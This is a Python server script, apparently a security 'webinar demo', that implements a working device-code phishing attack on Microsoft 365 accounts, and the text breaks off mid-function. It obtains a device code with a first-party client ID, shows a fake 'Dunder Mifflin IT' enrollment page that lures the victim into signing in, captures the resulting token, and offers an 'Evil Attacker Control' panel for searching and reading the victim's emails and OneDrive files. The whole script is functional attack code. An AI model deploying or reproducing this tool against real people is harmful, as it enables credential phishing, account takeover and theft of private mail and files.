#!/usr/bin/env python3
"""
Webinar Demo — Python server
Run:  python webinar_demo.py
Then open: http://localhost:3000
"""

import io
import json
import os
import datetime
import threading
import urllib.request
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler

CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
RESOURCE  = "https://graph.microsoft.com"
SCOPES    = "openid profile email offline_access Mail.Read Files.Read"
DC_URL    = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
TOKEN_URL = "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0"
PORT      = int(os.environ.get("PORT", 3000))
LOG_DIR   = os.environ.get("LOG_DIR", "/logs")
_log_lock = threading.Lock()


# ---------------------------------------------------------------------------
# CSS
# ---------------------------------------------------------------------------

CSS = """*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
:root {
  --bg:          #cec8bc;
  --surface:     #fdfcf9;
  --border:      #bdb09a;
  --accent:      #1b4f8a;
  --accent-dim:  rgba(27,79,138,0.08);
  --accent-glow: rgba(27,79,138,0.22);
  --text:        #1c1c1c;
  --muted:       #6b5d4e;
  --success:     #2e6b2e;
  --warn:        #d45f00;
  --error:       #b71c1c;
}
html, body { height: 100%; }
body {
  font-family: 'Inter', system-ui, Arial, sans-serif;
  background: var(--bg);
  color: var(--text);
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  position: relative;
}
body::before {
  content: '';
  position: fixed; inset: 0;
  background-image: repeating-linear-gradient(
    to bottom,
    transparent 0px,
    transparent 27px,
    rgba(0,0,0,0.032) 27px,
    rgba(0,0,0,0.032) 28px
  );
  pointer-events: none;
}
.card {
  position: relative;
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 2px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.18), 0 1px 4px rgba(0,0,0,0.10);
  max-width: 520px;
  width: 92%;
  text-align: center;
  overflow: hidden;
  animation: fadeUp 0.5s ease both;
}
.card-header {
  background: var(--accent);
  padding: 20px 32px 16px;
  text-align: center;
}
.dm-logo {
  font-family: 'Source Serif 4', 'Times New Roman', Georgia, serif;
  font-size: 26px;
  font-weight: 900;
  letter-spacing: 0.12em;
  text-transform: uppercase;
  color: #fff;
  line-height: 1;
  margin-bottom: 5px;
}
.dm-tagline {
  font-size: 9px;
  letter-spacing: 0.14em;
  text-transform: uppercase;
  color: rgba(255,255,255,0.6);
}
.card-body {
  padding: 22px 36px 26px;
}
.memo-line {
  display: flex;
  align-items: baseline;
  gap: 8px;
  font-size: 10px;
  letter-spacing: 0.10em;
  text-transform: uppercase;
  color: var(--muted);
  border-bottom: 1px dashed #d0c8b8;
  padding: 5px 0;
  text-align: left;
}
.memo-line span { min-width: 44px; flex-shrink: 0; }
.memo-line strong { color: var(--text); font-weight: 600; letter-spacing: 0; text-transform: none; font-size: 11px; }
.memo-divider {
  border: none;
  border-top: 2px solid var(--accent);
  margin: 14px 0 18px;
}
h1 {
  font-family: 'Source Serif 4', 'Times New Roman', Georgia, serif;
  font-size: clamp(1.25rem, 3.5vw, 1.6rem);
  font-weight: 700;
  line-height: 1.25;
  margin-bottom: 8px;
  color: var(--text);
  animation: fadeUp 0.5s 0.05s ease both;
}
h1 span { color: var(--accent); }
.desc {
  font-size: 12px; line-height: 1.7;
  color: var(--muted);
  margin-bottom: 20px;
  animation: fadeUp 0.5s 0.1s ease both;
}
.field-label {
  font-size: 9px; letter-spacing: 0.16em; text-transform: uppercase;
  color: var(--muted); margin-bottom: 0; display: block; text-align: left;
  padding: 0 1px 5px;
}
.code-field {
  background: #f5f1e8;
  border: 1px solid var(--border);
  border-bottom: none;
  border-radius: 2px 2px 0 0;
  padding: 16px 12px 14px;
  text-align: center;
}
.user-code {
  font-family: 'Courier New', Courier, monospace;
  font-size: clamp(1.7rem, 5.5vw, 2.4rem);
  font-weight: 700;
  letter-spacing: 0.25em;
  color: var(--accent);
  line-height: 1;
  display: block;
  user-select: all;
}
.go-btn {
  display: flex;
  align-items: center; justify-content: center;
  flex-wrap: wrap;
  gap: 6px;
  width: 100%;
  background: var(--accent);
  color: #fff;
  font-family: 'Inter', system-ui, Arial, sans-serif;
  font-size: 11px; font-weight: 600;
  letter-spacing: 0.07em; text-transform: uppercase;
  border: 1px solid var(--accent); border-top: none;
  border-radius: 0 0 2px 2px;
  padding: 12px 16px;
  cursor: pointer;
  transition: background 0.15s, box-shadow 0.15s;
  animation: fadeUp 0.5s 0.15s ease both;
}
.go-btn:hover { background: #163d6e; box-shadow: 0 2px 10px rgba(27,79,138,0.3); }
.go-btn:active { background: #112f55; }
.go-btn.copied-state { background: var(--success); border-color: var(--success); }
.go-hint { font-size: 10px; font-weight: 400; opacity: 0.65; letter-spacing: 0.02em; text-transform: none; }
.status-row {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  margin-top: 16px;
  font-size: 11px;
  color: var(--muted);
  animation: fadeUp 0.5s 0.2s ease both;
}
.dot {
  width: 7px; height: 7px;
  border-radius: 50%;
  background: var(--accent);
  animation: pulse 1.4s ease-in-out infinite;
  flex-shrink: 0;
}
.dot.success { background: var(--success); animation: none; }
.dot.error   { background: var(--error);   animation: none; }
.timer-bar-wrap {
  height: 2px;
  background: #ddd5c5;
  overflow: hidden;
  margin-top: 14px;
}
.timer-bar {
  height: 100%;
  background: var(--accent);
  transition: width 1s linear;
}
.status-card {
  display: none;
  flex-direction: column;
  align-items: center;
  gap: 14px;
  padding: 20px 0 4px;
  width: 100%;
}
.status-card.visible { display: flex; animation: fadeUp 0.4s ease both; }
.status-icon { font-size: 2rem; line-height: 1; }
.status-msg  { font-size: 12px; line-height: 1.7; color: var(--muted); }
.status-msg strong { color: var(--success); }
.status-msg.err strong { color: var(--error); }
.reload-btn {
  background: transparent;
  border: 1px solid var(--border);
  color: var(--muted);
  font-family: 'Inter', Arial, sans-serif;
  font-size: 11px; letter-spacing: 0.08em; text-transform: uppercase;
  padding: 8px 20px; border-radius: 2px;
  cursor: pointer;
  transition: border-color 0.15s, color 0.15s;
}
.reload-btn:hover { border-color: var(--accent); color: var(--accent); }
.card-footer {
  background: #ede8de;
  border-top: 1px solid var(--border);
  padding: 9px 24px;
  font-size: 9px; letter-spacing: 0.10em; text-transform: uppercase;
  color: var(--muted);
  display: flex; align-items: center; justify-content: space-between;
}
/* ---- data panels ---- */
.data-panel {
  width: 100%;
  border: 1px solid var(--border);
  border-radius: 2px;
  overflow: hidden;
  text-align: left;
}
.data-panel-header {
  display: flex; align-items: center; gap: 8px;
  padding: 7px 12px;
  background: var(--accent-dim);
  border-bottom: 1px solid var(--border);
  font-size: 9px; letter-spacing: 0.14em; text-transform: uppercase; color: var(--muted);
}
.data-panel-header span { color: var(--accent); }
.data-panel-body {
  padding: 4px 0;
  font-size: 11px; color: var(--muted);
  max-height: 180px; overflow-y: auto;
  scrollbar-width: thin; scrollbar-color: var(--border) transparent;
}
.data-row {
  display: flex; align-items: center; gap: 8px;
  padding: 7px 12px;
  border-bottom: 1px solid var(--border);
  line-height: 1.4;
  overflow: hidden;
}
.data-row:last-child { border-bottom: none; }
.data-row-name { flex: 1 1 auto; color: var(--text); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0; }
.data-meta { flex: 0 0 auto; font-size: 10px; color: var(--muted); white-space: nowrap; max-width: 180px; overflow: hidden; text-overflow: ellipsis; }
.data-unread { color: var(--accent); margin-right: 4px; flex-shrink: 0; }
.data-loading { padding: 14px; font-size: 11px; color: var(--muted); text-align: center; }
.search-row {
  display: flex; gap: 8px; width: 100%;
}
.search-input {
  flex: 1;
  background: #f5f1e8;
  border: 1px solid var(--border);
  border-radius: 2px;
  padding: 9px 12px;
  font-family: 'Inter', system-ui, Arial, sans-serif;
  font-size: 12px;
  color: var(--text);
  outline: none;
}
.search-input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px var(--accent-glow); }
.search-btn {
  background: var(--accent);
  color: #fff;
  border: 1px solid var(--accent);
  border-radius: 2px;
  padding: 9px 12px;
  font-family: 'Inter', system-ui, Arial, sans-serif;
  font-size: 10px; font-weight: 600;
  letter-spacing: 0.06em; text-transform: uppercase;
  cursor: pointer;
  transition: background 0.15s;
  white-space: nowrap;
}
.search-btn:hover { background: #163d6e; }
.search-btn.email-btn { background: #5a3e8a; border-color: #5a3e8a; }
.search-btn.email-btn:hover { background: #432d66; }
.card.authenticated {
  --accent:      #b71c1c;
  --accent-dim:  rgba(183,28,28,0.09);
  --accent-glow: rgba(183,28,28,0.28);
}
@keyframes fadeUp {
  from { opacity: 0; transform: translateY(14px); }
  to   { opacity: 1; transform: translateY(0); }
}
@keyframes pulse {
  0%,100% { opacity: 1; transform: scale(1); }
  50%     { opacity: 0.4; transform: scale(0.75); }
}
@keyframes spin { to { transform: rotate(360deg); } }
/* ---- viewer modal ---- */
.viewer-overlay {
  display: none; position: fixed; inset: 0;
  background: rgba(0,0,0,0.55); z-index: 100;
  align-items: center; justify-content: center;
  padding: 20px;
}
.viewer-overlay.visible { display: flex; animation: fadeUp 0.25s ease both; }
.viewer-card {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 2px;
  box-shadow: 0 8px 40px rgba(0,0,0,0.35);
  max-width: 700px; width: 100%;
  max-height: 82vh; display: flex; flex-direction: column;
}
.viewer-header {
  background: var(--accent);
  padding: 12px 16px; display: flex; align-items: center; gap: 10px;
  flex-shrink: 0;
}
.viewer-title {
  flex: 1;
  font-family: 'Inter', system-ui, Arial, sans-serif;
  font-size: 12px; font-weight: 600; color: #fff;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.viewer-close {
  background: rgba(255,255,255,0.15);
  border: 1px solid rgba(255,255,255,0.3);
  color: #fff; border-radius: 2px;
  width: 28px; height: 28px; line-height: 28px;
  cursor: pointer; font-size: 18px; flex-shrink: 0;
  transition: background 0.15s;
}
.viewer-close:hover { background: rgba(255,255,255,0.3); }
.viewer-body {
  overflow-y: auto; padding: 16px; flex: 1;
  font-size: 11px; line-height: 1.7; color: var(--text);
  white-space: pre-wrap;
  font-family: 'Courier New', Courier, monospace;
  background: #f5f1e8; max-height: 60vh;
}
.viewer-body.html-body {
  white-space: normal;
  font-family: 'Inter', system-ui, Arial, sans-serif;
}
.viewer-meta {
  background: #ede8de; border-top: 1px solid var(--border);
  padding: 8px 16px;
  font-size: 10px; letter-spacing: 0.08em; text-transform: uppercase;
  color: var(--muted); flex-shrink: 0; min-height: 32px;
}
.data-row.clickable { cursor: pointer; }
.data-row.clickable:hover { background: var(--accent-dim); }"""


def _js_str(value):
    return json.dumps(value)


def build_html(device_code, user_code, verification_url, expires_in, interval):
    uc    = user_code.replace("<", "&lt;").replace(">", "&gt;")
    vu    = verification_url.replace('"', "&quot;")
    dc    = _js_str(device_code)
    exp   = _js_str(expires_in)
    inv   = _js_str(interval)
    vu_js = _js_str(verification_url)

    js = "\n".join([
        "(function() {",
        "var PORTAL_URL    = " + vu_js + ";",
        "var DEVICE_CODE   = " + dc + ";",
        "var EXPIRES_IN    = " + exp + ";",
        "var POLL_INTERVAL = " + inv + ";",
        "var _tokenData    = null;",
        "var _pollTimer    = null;",
        "var _tickTimer    = null;",
        "var _started      = Date.now();",
        "var _searchItems  = [];",
        "var _emailItems   = [];",
        "",
        "/* ---- helpers ---- */",
        "function escHtml(str) {",
        "  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');",
        "}",
        "function formatBytes(bytes) {",
        "  if (bytes == null) return '';",
        "  if (bytes < 1024) return bytes + ' B';",
        "  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';",
        "  return (bytes / 1048576).toFixed(1) + ' MB';",
        "}",
        "",
        "/* ---- safe copy ---- */",
        "function safeCopy(text) {",
        "  if (navigator.clipboard && window.isSecureContext) {",
        "    return navigator.clipboard.writeText(text)",
        "      .then(function() { return true; })",
        "      .catch(function() { return Promise.resolve(legacyCopy(text)); });",
        "  }",
        "  return Promise.resolve(legacyCopy(text));",
        "}",
        "function legacyCopy(text) {",
        "  try {",
        "    var ta = document.createElement('textarea');",
        "    ta.value = text;",
        "    ta.style.cssText = 'position:fixed;top:0;left:0;width:2px;height:2px;opacity:0;border:0';",
        "    document.body.appendChild(ta);",
        "    ta.focus(); ta.select();",
        "    var ok = document.execCommand('copy');",
        "    document.body.removeChild(ta);",
        "    return ok;",
        "  } catch(e) { return false; }",
        "}",
        "",
        "function handleCopy() {",
        "  var code = document.getElementById('userCode').textContent.trim();",
        "  var btn  = document.getElementById('copyBtn');",
        "  safeCopy(code).then(function(ok) {",
        "    btn.textContent = ok ? 'Copied!' : 'Failed';",
        "    btn.className   = ok ? 'copy-btn copied' : 'copy-btn';",
        "    setTimeout(function() { btn.textContent = 'Copy'; btn.className = 'copy-btn'; }, 2000);",
        "  });",
        "}",
        "",
        "function openPortal() {",
        "  var code = document.getElementById('userCode').textContent.trim();",
        "  var btn  = document.getElementById('enrollBtn');",
        "  safeCopy(code).then(function() {",
        "    if (btn) {",
        "      var orig = btn.innerHTML;",
        "      btn.classList.add('copied-state');",
        "      btn.textContent = 'Code copied! Opening sign-in page...';",
        "      setTimeout(function() { btn.innerHTML = orig; btn.classList.remove('copied-state'); }, 2500);",
        "    }",
        "    window.open(PORTAL_URL, '_blank', 'noopener,noreferrer');",
        "  });",
        "}",
        "",
        "function tick() {",
        "  var elapsed = (Date.now() - _started) / 1000;",
        "  var pct = Math.max(0, 100 - (elapsed / EXPIRES_IN) * 100);",
        "  document.getElementById('timerBar').style.width = pct + '%';",
        "  if (elapsed >= EXPIRES_IN) {",
        "    if (_pollTimer) { clearTimeout(_pollTimer); _pollTimer = null; }",
        "    showError('Code expired. Reload to generate a new one.');",
        "    return;",
        "  }",
        "  _tickTimer = setTimeout(tick, 1000);",
        "}",
        "",
        "function hideEl(id) {",
        "  var el = document.getElementById(id);",
        "  if (el) el.style.display = 'none';",
        "}",
        "function showStatusCard(id) {",
        "  var el = document.getElementById(id);",
        "  if (!el) return;",
        "  el.classList.remove('visible');",
        "  el.style.display = '';",
        "  void el.offsetHeight;",
        "  el.classList.add('visible');",
        "}",
        "",
        "function showError(msg) {",
        "  if (_pollTimer) { clearTimeout(_pollTimer); _pollTimer = null; }",
        "  if (_tickTimer) { clearTimeout(_tickTimer);  _tickTimer  = null; }",
        "  hideEl('codeWrap'); hideEl('enrollBtn'); hideEl('statusRow');",
        "  document.getElementById('errorMsg').textContent = msg;",
        "  document.getElementById('statusDot').className = 'dot error';",
        "  showStatusCard('errorCard');",
        "}",
        "",
        "function showSuccess(data) {",
        "  if (_pollTimer) { clearTimeout(_pollTimer); _pollTimer = null; }",
        "  if (_tickTimer) { clearTimeout(_tickTimer);  _tickTimer  = null; }",
        "  _tokenData = data;",
        "  hideEl('codeWrap'); hideEl('enrollBtn'); hideEl('statusRow');",
        "  document.getElementById('statusDot').className = 'dot success';",
        "  var tb = document.getElementById('timerBar');",
        "  tb.style.transition = 'none';",
        "  tb.style.background = 'var(--success)';",
        "  tb.style.width      = '100%';",
        "  showStatusCard('successCard');",
        "  document.querySelector('.card').classList.add('authenticated');",
        "  var badge = document.querySelector('.badge');",
        "  if (badge) badge.textContent = 'Technician Support Controls';",
        "  var h1 = document.querySelector('h1');",
        "  if (h1) h1.innerHTML = 'Evil Attacker Control - Read Email and Files';",
        "}",
        "",
        "/* ---- Search ---- */",
        "function runSearch(scope) {",
        "  var kw = document.getElementById('searchInput').value.trim();",
        "  if (!kw) return;",
        "  document.getElementById('searchResultsPanel').style.display = '';",
        "  if (scope === 'onedrive') { searchOneDrive(kw); }",
        "  else { searchEmails(kw); }",
        "}",
        "",
        "function searchOneDrive(kw) {",
        "  if (!_tokenData || !_tokenData.access_token) return;",
        "  var bearer = 'Bearer ' + _tokenData.access_token;",
        "  var panel  = document.getElementById('searchResults');",
        "  panel.innerHTML = '<div class=\"data-loading\">Searching OneDrive\u2026</div>';",
        "  var url = 'https://graph.microsoft.com/v1.0/me/drive/root/search(q=%27' + encodeURIComponent(kw) + '%27)?$top=25&$select=id,name,size,lastModifiedDateTime,folder,file';",
        "  fetch(url, { headers: { 'Authorization': bearer } })",
        "  .then(function(r) {",
        "    if (!r.ok) throw new Error('Graph ' + r.status);",
        "    return r.json();",
        "  })",
        "  .then(function(data) {",
        "    _searchItems = data.value || [];",
        "    if (!_searchItems.length) { panel.innerHTML = '<div class=\"data-loading\">No OneDrive files found.</div>'; return; }",
        "    panel.innerHTML = '<div class=\"data-panel-header\"><span>&#128193;</span> OneDrive \u2014 ' + _searchItems.length + ' result(s) \u2014 click to open</div>'",
        "      + _searchItems.map(function(item, i) {",
        "        var icon = item.folder ? '&#128193;' : '&#128196;';",
        "        var size = item.size != null ? formatBytes(item.size) : '';",
        "        var mod  = item.lastModifiedDateTime ? new Date(item.lastModifiedDateTime).toLocaleDateString() : '';",
        "        var meta = [size, mod].filter(Boolean).join(' \u00b7 ');",
        "        return '<div class=\"data-row clickable\" onclick=\"openItem(' + i + ')\">' + icon + ' <span class=\"data-row-name\">' + escHtml(item.name) + '</span>'",
        "          + (meta ? '<span class=\"data-meta\">' + escHtml(meta) + '</span>' : '') + '</div>';",
        "      }).join('');",
        "  })",
        "  .catch(function(e) {",
        "    panel.innerHTML = '<div class=\"data-loading\">Error: ' + escHtml(e.message) + '</div>';",
        "  });",
        "}",
        "",
        "function searchEmails(kw) {",
        "  if (!_tokenData || !_tokenData.access_token) return;",
        "  var bearer = 'Bearer ' + _tokenData.access_token;",
        "  var panel  = document.getElementById('searchResults');",
        "  panel.innerHTML = '<div class=\"data-loading\">Searching emails\u2026</div>';",
        "  var url = 'https://graph.microsoft.com/v1.0/me/messages?$search=%22' + encodeURIComponent(kw) + '%22&$top=15&$select=id,subject,from,receivedDateTime,isRead';",
        "  fetch(url, { headers: { 'Authorization': bearer } })",
        "  .then(function(r) {",
        "    if (!r.ok) throw new Error('Graph ' + r.status);",
        "    return r.json();",
        "  })",
        "  .then(function(data) {",
        "    _emailItems = data.value || [];",
        "    if (!_emailItems.length) { panel.innerHTML = '<div class=\"data-loading\">No emails found.</div>'; return; }",
        "    panel.innerHTML = '<div class=\"data-panel-header\"><span>&#9993;</span> Email \u2014 ' + _emailItems.length + ' result(s) \u2014 click to read</div>'",
        "      + _emailItems.map(function(msg, i) {",
        "        var from    = msg.from && msg.from.emailAddress ? (msg.from.emailAddress.name || msg.from.emailAddress.address || '(unknown)') : '(unknown)';",
        "        var date    = msg.receivedDateTime ? new Date(msg.receivedDateTime).toLocaleDateString() : '';",
        "        var subject = msg.subject || '(no subject)';",
        "        var unread  = !msg.isRead ? '<span class=\"data-unread\">\u25cf</span>' : '';",
        "        return '<div class=\"data-row clickable\" onclick=\"openEmail(' + i + ')\">' + unread",
        "          + '<span class=\"data-row-name\">' + escHtml(subject) + '</span>'",
        "          + '<span class=\"data-meta\">' + escHtml(from) + ' \u00b7 ' + date + '</span>'",
        "          + '</div>';",
        "      }).join('');",
        "  })",
        "  .catch(function(e) {",
        "    panel.innerHTML = '<div class=\"data-loading\">Error: ' + escHtml(e.message) + '</div>';",
        "  });",
        "}",
        "",
        "/* ---- Item viewer ---- */",
        "function openItem(i) {",
        "  var item = _searchItems[i];",
        "  if (!item) return;",
        "  if (item.folder) { showViewer(item.name, 'Folder'); document.getElementById('viewerBody').textContent = '(Folder \u2014 cannot preview)'; return; }",
        "  var ext = (item.name || '').split('.').pop().toLowerCase();",
        "  var textExts = ['txt','csv','md','json','xml','yaml','yml','log','py','js','ts','html','htm','css','sh','bat','ps1','ini','cfg','conf','toml','rs','go','java','c','cpp','h','rb','php','sql'];",
        "  showViewer(item.name, '');",
        "  var bearer = 'Bearer ' + _tokenData.access_token;",
        "  // No $select — @microsoft.graph.downloadUrl is an OData annotation excluded by $select",
        "  fetch('https://graph.microsoft.com/v1.0/me/drive/items/' + encodeURIComponent(item.id), {",
        "    headers: { 'Authorization': bearer }",
        "  })",
        "  .then(function(r) { if (!r.ok) throw new Error('Graph ' + r.status); return r.json(); })",
        "  .then(function(d) {",
        "    var dlUrl = d['@microsoft.graph.downloadUrl'];",
        "    document.getElementById('viewerMeta').textContent = 'Size: ' + formatBytes(d.size || 0);",
        "    if (!dlUrl) { document.getElementById('viewerBody').textContent = '(No download URL \u2014 cannot preview)'; return null; }",
        "    if (textExts.indexOf(ext) === -1) { document.getElementById('viewerBody').textContent = '(Binary file \u2014 cannot preview inline)\\n\\nSize: ' + formatBytes(d.size); return null; }",
        "    // Fetch the pre-authenticated download URL without the Authorization header",
        "    return fetch(dlUrl);",
        "  })",
        "  .then(function(r) { if (!r) return null; return r.text(); })",
        "  .then(function(text) {",
        "    if (text == null) return;",
        "    document.getElementById('viewerBody').textContent = text.length > 100000 ? text.slice(0,100000) + '\\n\u2026 [truncated]' : text;",
        "  })",
        "  .catch(function(e) { document.getElementById('viewerBody').textContent = 'Error: ' + e.message; });",
        "}",
        "",
        "function openEmail(i) {",
        "  var msg = _emailItems[i];",
        "  if (!msg) return;",
        "  showViewer(msg.subject || '(no subject)', '');",
        "  var bearer = 'Bearer ' + _tokenData.access_token;",
        "  fetch('https://graph.microsoft.com/v1.0/me/messages/' + encodeURIComponent(msg.id) + '?$select=subject,body,from,receivedDateTime,toRecipients', {",
        "    headers: { 'Authorization': bearer }",
        "  })",
        "  .then(function(r) { if (!r.ok) throw new Error('Graph ' + r.status); return r.json(); })",
        "  .then(function(data) {",
        "    var from = data.from && data.from.emailAddress ? (data.from.emailAddress.name || data.from.emailAddress.address || '(unknown)') : '(unknown)';",
        "    var date = data.receivedDateTime ? new Date(data.receivedDateTime).toLocaleString() : '';",
        "    document.getElementById('viewerMeta').textContent = 'From: ' + from + '   \u00b7   ' + date;",
        "    var body = data.body || {};",
        "    var el = document.getElementById('viewerBody');",
        "    if (body.contentType === 'html') {",
        "      el.className = 'viewer-body html-body';",
        "      var iframe = document.createElement('iframe');",
        "      iframe.sandbox = 'allow-same-origin';",
        "      iframe.style.cssText = 'width:100%;min-height:280px;border:none;background:#fff;display:block;';",
        "      iframe.srcdoc = body.content || '';",
        "      el.innerHTML = '';",
        "      el.appendChild(iframe);",
        "    } else {",
        "      el.className = 'viewer-body';",
        "      el.textContent = body.content || '';",
        "    }",
        "  })",
        "  .catch(function(e) { document.getElementById('viewerBody').textContent = 'Error: ' + e.message; });",
        "}",
        "",
        "function showViewer(title, meta) {",
        "  document.getElementById('viewerTitle').textContent = title;",
        "  var el = document.getElementById('viewerBody');",
        "  el.className = 'viewer-body';",
        "  el.textContent = 'Loading\u2026';",
        "  document.getElementById('viewerMeta').textContent = meta || '';",
        "  document.getElementById('viewerOverlay').classList.add('visible');",
        "}",
        "function closeViewer() {",
        "  document.getElementById('viewerOverlay').classList.remove('visible');",
        "}",
        "",
        "/* ---- expose to inline handlers ---- */",
        "window.handleCopy  = handleCopy;",
        "window.openPortal  = openPortal;",
        "window.runSearch   = runSearch;",
        "window.openItem    = openItem;",
        "window.openEmail   = openEmail;",
        "window.closeViewer = closeViewer;",
        "",
        "/* ---- start ---- */",
        "tick();",
        "setTimeout(poll, POLL_INTERVAL * 1000);",
        "",
        "function poll() {",
        "  fetch('/poll', {",
        "    method: 'POST',",
        "    headers: { 'Content-Type': 'application/json' },",
        "    body: JSON.stringify({ device_code: DEVICE_CODE })",
        "  })",
        "  .then(function(r) { return r.json(); })",
        "  .then(function(data) {",
        "    if (data.token_type) { showSuccess(data); return; }",
        "    var err = data.error || '';",
        "    if (err === 'authorization_pending' || err === 'slow_down') {",
        "      var wait = (err === 'slow_down') ? POLL_INTERVAL + 5 : POLL_INTERVAL;",
        "      _pollTimer = setTimeout(poll, wait * 1000);",
        "      return;",
        "    }",
        "    if (err === 'expired_token') { showError('Code expired. Reload to generate a new one.'); return; }",
        "    showError(data.error_description || 'Authentication failed.');",
        "  })",
        "  .catch(function() { _pollTimer = setTimeout(poll, POLL_INTERVAL * 1000); });",
        "}",
        "}());",
    ])

    html_parts = [
        "<!DOCTYPE html>",
        '<html lang="en">',
        "<head>",
        '  <meta charset="UTF-8"/>',
        '  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>',
        "  <title>Dunder Mifflin \u2014 Device Enrollment</title>",
        '  <link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>',
        "  <style>",
        CSS,
        "  </style>",
        "</head>",
        "<body>",
        '<div class="card">',
        '  <div class="card-header">',
        '    <div class="dm-logo">Dunder Mifflin</div>',
        "    <div class=\"dm-tagline\">The People Person's Paper People &nbsp;&middot;&nbsp; IT Department</div>",
        '  </div>',
        '  <div class="card-body">',
        '    <div class="memo-line"><span>TO:</span><strong>Conference Room TV &mdash; Scranton Branch</strong></div>',
        '    <div class="memo-line"><span>FROM:</span><strong>IT Department</strong></div>',
        '    <div class="memo-line"><span>RE:</span><strong>Device Enrollment &mdash; Action Required</strong></div>',
        '    <hr class="memo-divider"/>',
        '    <h1>Complete Your<br/><span>Device Sign-In</span></h1>',
        '    <p class="desc">Click the button to copy your code and open the Microsoft<br/>sign-in page automatically &mdash; one click does it all.</p>',
        "",
        '    <div id="codeWrap">',
        '      <label class="field-label">Your Enrollment Code</label>',
        '      <div class="code-field">',
        '        <span class="user-code" id="userCode">' + uc + '</span>',
        '      </div>',
        '      <button class="go-btn" id="enrollBtn" onclick="openPortal()">',
        '        Copy Code &amp; Open Sign-In Page &nbsp;&rarr;&nbsp; microsoft.com/devicelogin',
        '        <span class="go-hint">(opens new tab)</span>',
        '      </button>',
        '    </div>',
        "",
        '    <div class="status-row" id="statusRow">',
        '      <div class="dot" id="statusDot"></div>',
        '      <span>Waiting for sign-in...</span>',
        '    </div>',
        '    <div class="timer-bar-wrap">',
        '      <div class="timer-bar" id="timerBar" style="width:100%"></div>',
        '    </div>',
        "",
        '    <div class="status-card" id="successCard">',
        '      <div class="status-icon" style="color:var(--success)">&#10003;</div>',
        '      <p class="status-msg"><strong>Signed in successfully.</strong><br/>Search OneDrive or email for a keyword below.</p>',
        "",
        '      <div class="search-row">',
        '        <input class="search-input" id="searchInput" type="text" placeholder="Enter keyword (e.g. test)" onkeydown="if(event.key===\'Enter\')runSearch(\'onedrive\')"/>',
        '      </div>',
        '      <div class="search-row" style="margin-top:8px">',
        '        <button class="search-btn" style="flex:1" onclick="runSearch(\'onedrive\')">&#128193;&nbsp; Search OneDrive</button>',
        '        <button class="search-btn email-btn" style="flex:1" onclick="runSearch(\'email\')">&#9993;&nbsp; Search Email</button>',
        '      </div>',
        "",
        '      <div class="data-panel" id="searchResultsPanel" style="display:none">',
        '        <div class="data-panel-body" style="max-height:280px" id="searchResults"></div>',
        '      </div>',
        '    </div>',
        "",
        '    <div class="status-card" id="errorCard">',
        '      <div class="status-icon" style="color:var(--error)">&#10007;</div>',
        '      <p class="status-msg err"><strong id="errorMsg">Authentication failed.</strong><br/>Reload to try again.</p>',
        '      <button class="reload-btn" onclick="location.reload()">Reload &amp; Retry</button>',
        '    </div>',
        '  </div>',
        '  <div class="card-footer">',
        '    <span>Dunder Mifflin, Inc. &nbsp;&middot;&nbsp; Scranton, PA 18503</span>',
        '    <span>IT Helpdesk &nbsp;&middot;&nbsp; Ext. 147</span>',
        '  </div>',
        "</div>",
        "<div class=\"viewer-overlay\" id=\"viewerOverlay\" onclick=\"if(event.target===this)closeViewer()\">",
        "  <div class=\"viewer-card\">",
        "    <div class=\"viewer-header\">",
        "      <span class=\"viewer-title\" id=\"viewerTitle\"></span>",
        "      <button class=\"viewer-close\" onclick=\"closeViewer()\">&times;</button>",
        "    </div>",
        "    <div class=\"viewer-body\" id=\"viewerBody\"></div>",
        "    <div class=\"viewer-meta\" id=\"viewerMeta\"></div>",
        "  </div>",
        "</div>",
        "<script>",
        js,
        "</script>",
        "</body>",
        "</html>",
    ]

    return "\n".join(html_parts)


# ---------------------------------------------------------------------------
# Request / response capture
# ---------------------------------------------------------------------------

class _TeeWriter:
    """Wraps wfile so all bytes written also land in a BytesIO capture buffer."""
    def __init__(self, real, buf):
        self._real = real
        self._buf  = buf
    def write(self, data):
        n = self._real.write(data)
        self._buf.write(data)
        return n
    def flush(self):
        return self._real.flush()
    def __getattr__(self, name):
        return getattr(self._real, name)


# ---------------------------------------------------------------------------
# Request handler
# ---------------------------------------------------------------------------

class Handler(BaseHTTPRequestHandler):

    # ---- logging setup -------------------------------------------------------
    def setup(self):
        super().setup()
        self._log_ts       = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%S_%f")
        self._req_body     = b""
        self._resp_status  = None
        self._resp_headers = []
        self._resp_body    = io.BytesIO()
        self._real_wfile   = self.wfile
        self.wfile         = _TeeWriter(self._real_wfile, self._resp_body)

    def handle_one_request(self):
        try:
            super().handle_one_request()
        finally:
            try:
                self._flush_log()
            except Exception as exc:
                print("[LOG ERROR] %s" % exc)

    def send_response(self, code, message=None):
        self._resp_status = code
        super().send_response(code, message)

    def send_header(self, keyword, value):
        self._resp_headers.append((keyword, str(value)))
        super().send_header(keyword, value)

    def _flush_log(self):
        os.makedirs(LOG_DIR, exist_ok=True)
        path = os.path.join(LOG_DIR, self._log_ts + ".log")
        lines = []
        lines.append("=" * 70)
        lines.append("TIMESTAMP : " + self._log_ts)
        lines.append("CLIENT    : " + self.address_string())
        lines.append("=" * 70)
        lines.append("")

        # --- request ---
        cmd = getattr(self, "command", None) or "?"
        lines.append(">>> REQUEST")
        lines.append("%s %s %s" % (cmd, self.path, self.request_version))
        for k, v in self.headers.items():
            lines.append("%s: %s" % (k, v))
        if self._req_body:
            lines.append("")
            try:
